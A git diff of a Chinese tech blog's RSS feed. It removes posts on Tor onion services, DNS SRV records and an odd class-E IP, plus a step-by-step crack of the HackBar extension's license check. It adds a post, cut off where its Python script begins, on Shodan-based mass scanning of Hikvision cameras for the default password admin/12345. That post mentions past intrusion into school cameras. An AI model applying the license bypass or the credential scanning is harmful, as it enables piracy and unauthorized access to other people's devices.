@@ -1047,79 +1047,6 @@ export NALI_DB_HOME=/home/nali
 </code></pre></td></tr></table>
 </div>
 </div><p>可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制</p>
-]]></description></item><item><title>一个来自保留IP地址的连接</title><link>https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/</link><pubDate>Mon, 25 May 2020 15:22:09 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/</guid><description><![CDATA[<p>昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜</p>
-<p>万万没有想到，记录下来的IP地址竟然是是 244.242.105.51</p>
-<p></p>
-<p>这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊</p>
-<p>考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的</p>
-<p>IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我</p>
-<p>下面记录一下我对这个的分析</p>
-<h2 id="大端小端">大端？小端？</h2>
-<p>众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序</p>
-<p>而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序</p>
-<p>文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录</p>
-<p>我个人认为这个猜测不成立</p>
-<p>因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误</p>
-<p>即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent</p>
-<h2 id="tor">Tor?</h2>
-<p>考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip</p>
-<p>tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？</p>
-<h3 id="提供onion-service">提供onion service</h3>
-<p>如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip</p>
-<p>通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点</p>
-<p>ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由</p>
-<p>所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正</p>
-<p>而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！</p>
-<h3 id="不提供onion-service">不提供onion service</h3>
-<p>如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊</p>
-<p>所以通过tor的某些机制伪造成这个E类ip不太现实</p>
-<h2 id="路由劫持">路由劫持？</h2>
-<p>我对公网的路由不太了解，但是看样子进行路由劫持是有可能的</p>
-<p>如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊</p>
-<blockquote>
-<p>才疏学浅，文中可能有错误，欢迎指正
-目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我</p>
-</blockquote>
-]]></description></item><item><title>Tor洋葱服务如何工作</title><link>https://lgf.im/posts/learn/how-do-onion-service-work/</link><pubDate>Mon, 25 May 2020 14:13:37 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/learn/how-do-onion-service-work/</guid><description><![CDATA[<p>昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录</p>
-<h2 id="通信流程">通信流程</h2>
-<p>这里要描述的通讯是 用户通过 tor浏览器 连接 洋葱服务 的过程</p>
-<p>为了方便表达，这里用Alice表示客户端，Bob表示服务端</p>
-<h3 id="第一步服务端设置自己的介绍节点">第一步：服务端设置自己的介绍节点</h3>
-<p></p>
-<p>服务端为了不暴漏自己的IP，使用 介绍节点(introduction points) 来转发来自客户端的介绍信</p>
-<p>首先，Bob从 tor中继节点列表 中挑选几个节点来做自己的 介绍节点，然后与它们建立 长连接(long-term circuits)</p>
-<p>这里的长连接是通过tor网络建立起来的，所以是匿名的，介绍节点不会知道Bob的IP</p>
-<p>同时，Bob会给介绍节点发送一个 身份验证密钥(authentication key)，当有客户端连接这个介绍节点时，通过这个密钥便能判断这个连接是否是找Bob的</p>
-<h3 id="第二步服务端公开自己的信息">第二步：服务端公开自己的信息</h3>
-<p></p>
-<p>Bob 生成一个 描述信息(onion service descriptor)，里面存储了介绍节点列表，包括介绍节点的ip和相应的身份验证密钥</p>
-<p>然后Bob用自己的私钥对这个消息签名，并将这个消息发布到Tor的DHT中</p>
-<p>经过这步操作，tor客户端便可以通过某个key从DHT中获取到这个消息，从而找到Bob的介绍节点</p>
-<h3 id="第三步客户端获取介绍节点列表">第三步：客户端获取介绍节点列表</h3>
-<p></p>
-<p>Alice（客户端）从某些途径知道Bob有一个洋葱服务，并且知道这个服务的onion域名，例如 xyz.onion，此时Alice想要访问Bob.</p>
-<p>首先，她向DHT网络请求该域名对应的信息，也就是第二步中Bob发布的那个描述消息</p>
-<p>获取到消息后，Alice对其签名进行验证，验证使用的Bob的公钥其实已经被编码到 xyz.onion 这个域名中了，Alice可以从域名中解码出来</p>
-<p>消息没问题，Alice从消息中解析出Bob的介绍节点列表，选择其中一个介绍节点，Alice将要向Bob介绍自己</p>
-<h3 id="第四步客户端选择一个会合节点">第四步：客户端选择一个会合节点</h3>
-<p></p>
-<p>Alice从tor中继节点列表中选择一个节点作为 会合节点(rendezvous point)，然后通过tor与该 会合节点(RP) 建立连接</p>
-<p>同时，Alice会给会合节点发送一个 一次性密码(one-time secret)，这个密码会在回合过程中使用</p>
-<h3 id="第五步客户端向服务端介绍自己">第五步：客户端向服务端介绍自己</h3>
-<p>Alice生成一个消息，包含 会合节点 和 一次性密码，然后用Bob的公钥对消息进行加密</p>
-<p>Alice通过Tor网络连接上 Bob 的一个介绍节点，让该介绍节点把加密后的消息转发给Bob</p>
-<p></p>
-<h3 id="第六步服务端与客户端回合">第六步：服务端与客户端回合</h3>
-<p></p>
-<p>此时Bob已经收到介绍节点转发过来的消息，知道Alice想要访问自己，并且知道了会合节点的信息</p>
-<p>Bob通过Tor网络连接会合节点，然后将收到的一次性密码发送给会合节点，会合节点由此知道 Bob是要与Alice通信，从而可以将Alice与Bob的消息进行中继</p>
-<h2 id="安全性">安全性</h2>
-<p>客户端与服务端最终是通过会合节点通讯的，他们都各自通过tor网络分别连接会合节点，因此既能够保证客户端的隐匿性又能够保证服务端不暴露</p>
-<p>在上面流程中的所有通讯都是用过tor网络建立的，包括 服务端与介绍节点的通讯、客户端与介绍节点的通讯、客户端与会合节点的通讯、服务端与会合节点的通讯</p>
-<p>因此，正常情况下tor客户端与洋葱服务通讯是经过6次中转的，包括客户端连接会合节点的3次和服务端连接会合节点的3次</p>
-<p>如果tor客户端访问的服务不是洋葱服务，那通讯过程就不是上面那个流程了，也只有3次中转了</p>
-<h2 id="参考资料">参考资料</h2>
-<p><a href="https://community.torproject.org/onion-services/overview/">https://community.torproject.org/onion-services/overview/</a></p>
 ]]></description></item><item><title>Linux添加swap</title><link>https://lgf.im/posts/linux/linux-add-swap/</link><pubDate>Sun, 12 Apr 2020 20:38:26 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/linux/linux-add-swap/</guid><description><![CDATA[<p>给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下</p>
 <h2 id="查看当前swap">查看当前swap</h2>
 <div class="highlight"><div class="chroma">
@@ -1879,76 +1806,6 @@ drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <s
 <p>如果你想了解功能，通过下面的命令查看官方文档吧</p>
 <p><code>man -Len -Pless\ +/^REDIRECTION bash</code></p>
 <p>本文的参考资料： <a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener noreffer">stack overflow</a></p>
-]]></description></item><item><title>DNS中SRV记录</title><link>https://lgf.im/posts/learn/dns-srv-record/</link><pubDate>Tue, 24 Mar 2020 13:54:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/learn/dns-srv-record/</guid><description><![CDATA[<p>SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。</p>
-<p>简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。</p>
-<p>SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。</p>
-<h3 id="rfc2782">RFC2782</h3>
-<h4 id="概述和理由">概述和理由</h4>
-<p>目前，必须知道服务器的确切地址才能联系它或者广播问题。</p>
-<p>SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。</p>
-<p>客户端要求特定域名的特定服务/协议（这里使用的词汇&quot;域名&quot;是RFC 1034上严格定义的），并获取任何可用服务器的名称。</p>
-<p>请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。</p>
-<h4 id="rfc定义的格式">RFC定义的格式</h4>
-<p>RFC2782中定义的格式是：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">_Service._Proto.Name TTL Class SRV Priority Weight Port Target
-</code></pre></td></tr></table>
-</div>
-</div><p>各字段详细说明：</p>
-<table>
-<thead>
-<tr>
-<th>字段</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Service</td>
-<td>所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线<code>_</code>，以避免与自然界中出现的DNS标签发生冲突。</td>
-</tr>
-<tr>
-<td>Proto</td>
-<td>所需协议的符号名称。前面加下划线<code>_</code>，以防止与自然界中出现的DNS标签发生冲突。 <code>_TCP</code>和<code>_UDP</code>目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。</td>
-</tr>
-<tr>
-<td>Name</td>
-<td>此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题）</td>
-</tr>
-<tr>
-<td>TTL</td>
-<td></td>
-</tr>
-<tr>
-<td>Class</td>
-<td></td>
-</tr>
-<tr>
-<td>Priority</td>
-<td></td>
-</tr>
-<tr>
-<td>Weight</td>
-<td></td>
-</tr>
-<tr>
-<td>Port</td>
-<td>服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。</td>
-</tr>
-<tr>
-<td>Target</td>
-<td>目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="srv记录和微软的关系">SRV记录和微软的关系</h3>
-<p>SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。</p>
-<p>SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。</p>
-<p>鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。</p>
 ]]></description></item><item><title>MySQL中几个concat的用法与区别</title><link>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</link><pubDate>Sun, 22 Mar 2020 18:23:34 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</guid><description><![CDATA[<h2 id="讲解与示例">讲解与示例</h2>
 <h3 id="concatstr1-str2-">CONCAT(str1, str2, &hellip;)</h3>
 <ol>
@@ -2210,182 +2067,7 @@ mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span clas
 <h3 id="group_concat">group_concat</h3>
 <p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p>
 <p></p>
-]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
-<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
-<p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
-<p></p>
-<p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p>
-<p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p>
-<p></p>
-<p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p>
-<h2 id="破解插件">破解插件</h2>
-<h3 id="找到插件路径">找到插件路径</h3>
-<p>首先我们需要在官网上找到插件的安装地址并进行安装</p>
-<p></p>
-<p>安装后插件会存放在我们电脑的本地</p>
-<p>在chrome中打开 <a href="chrome://version/" target="_blank" rel="noopener noreffer">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p>
-<p></p>
-<p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p>
-<p></p>
-<p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p>
-<h3 id="分析授权验证">分析授权验证</h3>
-<p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// 授权验证失败
-</span><span class="c1"></span><span class="kd">function</span> <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">message</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// 将hidden属性移除，就会显示输入证书的红框
-</span><span class="c1"></span>    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license&#39;</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;hidden&#39;</span><span class="p">);</span>
-    <span class="c1">// 如果有消息，就在证书那个红框显示出来
-</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">message</span><span class="p">){</span>
-        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license span&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="c1">// 标记证书无效
-</span><span class="c1"></span>    <span class="nx">license_ok</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="c1">// 从chrome本地存储中获取都license内容
-</span><span class="c1"></span><span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">([</span><span class="s1">&#39;license&#39;</span><span class="p">],</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kr">const</span> <span class="nx">license</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">license</span><span class="p">;</span>
-    <span class="c1">// 如果证书内容存在
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">license</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">//通过链接谷歌服务器检查网络情况
-</span><span class="c1"></span>        <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://google.com&#34;</span><span class="p">)</span>
-            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
-                <span class="c1">// 从证书服务器检查证书
-</span><span class="c1"></span>                <span class="nx">fetch</span><span class="p">(</span><span class="nx">license_server</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nx">license</span><span class="p">)</span>
-                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
-                        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
-                    <span class="p">})</span>
-                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-                        <span class="c1">// 无效的证书会返回
-</span><span class="c1"></span>                        <span class="c1">// {&#34;pong&#34;:false,&#34;message&#34;:&#34;License is invalid&#34;}
-</span><span class="c1"></span>                        <span class="kr">const</span> <span class="nx">pong</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">pong</span><span class="p">;</span>
-                        <span class="k">if</span> <span class="p">(</span><span class="nx">pong</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
-                            <span class="c1">// 证书无效，调用函数显示红框并使功能不可用
-</span><span class="c1"></span>                            <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
-                        <span class="p">}</span>
-                    <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
-                        <span class="c1">// 授权服务器连接不上
-</span><span class="c1"></span>                        <span class="nx">disable_hackbar</span><span class="p">();</span>
-                    <span class="p">});</span>
-            <span class="p">})</span>
-            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-            <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
-            <span class="p">});</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="c1">// 证书不存在，直接禁用插件
-</span><span class="c1"></span>        <span class="nx">disable_hackbar</span><span class="p">();</span>
-    <span class="p">}</span>
-<span class="p">});</span>
-
-<span class="p">........</span>
-<span class="c1">// 证书检查函数
-</span><span class="c1"></span><span class="kd">function</span> <span class="nx">check_license</span><span class="p">(){</span>
-    <span class="c1">// 检查 license_ok 标记
-</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">license_ok</span><span class="p">){</span>
-        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Please input valid license!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id="进行破解">进行破解</h3>
-<p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p>
-<ul>
-<li><code>license_ok</code> 一开始是 <code>true</code></li>
-<li>证书检查失败的红框一开始是隐藏的</li>
-<li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li>
-<li>只在一处地方会向 服务器 检查证书状况</li>
-<li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li>
-</ul>
-<p>也就是说，一共有两个关键点：</p>
-<ol>
-<li>证书检查失败的红框</li>
-<li>功能的正常使用</li>
-</ol>
-<p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p>
-<p>针对功能的正常使用，有很多办法可以达到：</p>
-<ol>
-<li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li>
-<li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li>
-</ol>
-<p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p>
-<blockquote>
-<p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p>
-</blockquote>
-<h2 id="插件安装">插件安装</h2>
-<p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p>
-<p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p>
-<p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p>
-<p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p>
-<p></p>
-<p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p>
-<blockquote>
-<p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布
-这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p>
-</blockquote>
-<p>安装后，按F12，插件就可以正常使用了</p>
-<p></p>
-<h2 id="总结">总结</h2>
-<p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
-]]></description></item><item><title>使用Github Actions对Hexo博客自动部署</title><link>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</link><pubDate>Sat, 21 Mar 2020 09:24:56 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+]]></description></item><item><title>使用Github Actions对Hexo博客自动部署</title><link>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</link><pubDate>Sat, 21 Mar 2020 09:24:56 +0800</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/use-github-actions-to-auto-deploy-hexo/</guid><description><![CDATA[<h2 id="前言">前言</h2>
 <p>很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 <code>hexo g</code> 生成静态网页，然后 <code>hexo d</code> 将public目录推送到github、coding、gitee等平台。</p>
 <p>但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。</p>
 <h2 id="操作">操作</h2>
@@ -3490,4 +3172,934 @@ sudo make install
 </code></pre></td></tr></table>
 </div>
 </div><p>执行 <code>make -j8</code> 然后去喝功夫茶</p>
-]]></description></item></channel></rss>
+]]></description></item><item><title>一些我刚学到的GIT技巧</title><link>https://lgf.im/posts/learn/some-git-skills/</link><pubDate>Sun, 01 Dec 2019 20:32:44 +0800</pubDate><author>作者</author><guid>https://lgf.im/posts/learn/some-git-skills/</guid><description><![CDATA[<h3 id="git-reflog">git reflog</h3>
+<p>git reflog 可以查看所有分支的所有操作记录（包括（包括commit和reset的操作），包括已经被删除的commit记录，git log则不能察看已经删除了的commit记录，而且跟进结果可以回退道某一个修改</p>
+<p>有时候想要删除reflog记录，可以使用下面的命令</p>
+<p>首先确保所有分支都没有引用该提交，包括HEAD也不指向这个提交。</p>
+<p>然后 git reflog expire &ndash;expire=now &ndash;all (这会清除分支变更历史)</p>
+<p>然后 git gc &ndash;prune=now (不用调整时间，加上&ndash;prune=now命令即可)</p>
+<h3 id="git-rebase">git rebase</h3>
+<p>参考文章：http://jartto.wang/2018/12/11/git-rebase/</p>
+<p>可以合并多次提交记录: git rebase -i HEAD~4</p>
+<p>可以合并分支而不产生merge记录</p>
+]]></description></item><item><title>针对海康威视网络摄像头弱密码的一次扫描</title><link>https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/</link><pubDate>Thu, 28 Nov 2019 20:15:06 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+<p>在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。</p>
+<p>海康威视web界面的弱密码是 admin  12345</p>
+<p>时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描</p>
+<h2 id="从shodan获取数据">从shodan获取数据</h2>
+<p>首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的</p>
+<p>之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高</p>
+<p>今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号</p>
+<p>有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision”</p>
+<p></p>
+<p>在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。</p>
+<p>下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了</p>
+<h2 id="提取有用信息">提取有用信息</h2>
+<p>有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
